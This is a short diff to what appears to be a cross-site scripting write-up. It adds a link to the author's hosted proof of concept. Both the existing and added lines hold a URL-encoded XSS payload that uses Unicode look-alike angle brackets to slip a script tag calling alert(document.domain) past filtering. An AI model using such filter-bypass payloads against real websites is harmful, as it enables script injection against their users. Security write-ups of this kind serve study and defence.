@@ -64,6 +64,9 @@ The last step is to host our code and insert the payload described above in the 
 
 https://mydomain/xmasxss.html?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5
 
+Here is my working POC:
+https://brunohalltari.github.io/PoC_Di_Bruno_Modificato/index.html?payload=--%EF%B9%A5%EF%B9%A4script%EF%B9%A5alert(document.domain)%EF%B9%A4/script%EF%B9%A5
+
 
 
 
